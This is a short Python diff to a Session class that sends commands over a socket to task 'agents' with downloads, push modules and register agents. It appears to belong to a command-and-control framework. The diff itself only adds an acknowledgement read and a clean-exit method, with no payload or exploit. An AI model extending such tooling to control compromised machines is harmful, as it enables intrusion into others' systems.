@@ -123,6 +123,8 @@ class Session():
     def do_download(self, agent_id, path):
         print("[ ] Doing Download...")
         self.channel.sendall("24|%s:%s" % (agent_id, path))
+        self.channel.recv(2)
+        print("[+] Tasked agent with download")
 
     def push_module(self, agent_id, filestruct):
         print("[ ] Pushing module file to agent %s..." % agent_id)
@@ -145,5 +147,10 @@ class Session():
     def register_agent(self, name, password):
         print("[ ] Registering agent with server...")
         self.channel.sendall('29|%s:%s' % (name, password))
+
+    def clean_exit(self):
+        self.channel.sendall("00")
+        self.channel = 0
+        print("[+] Backend closed down")
 
     
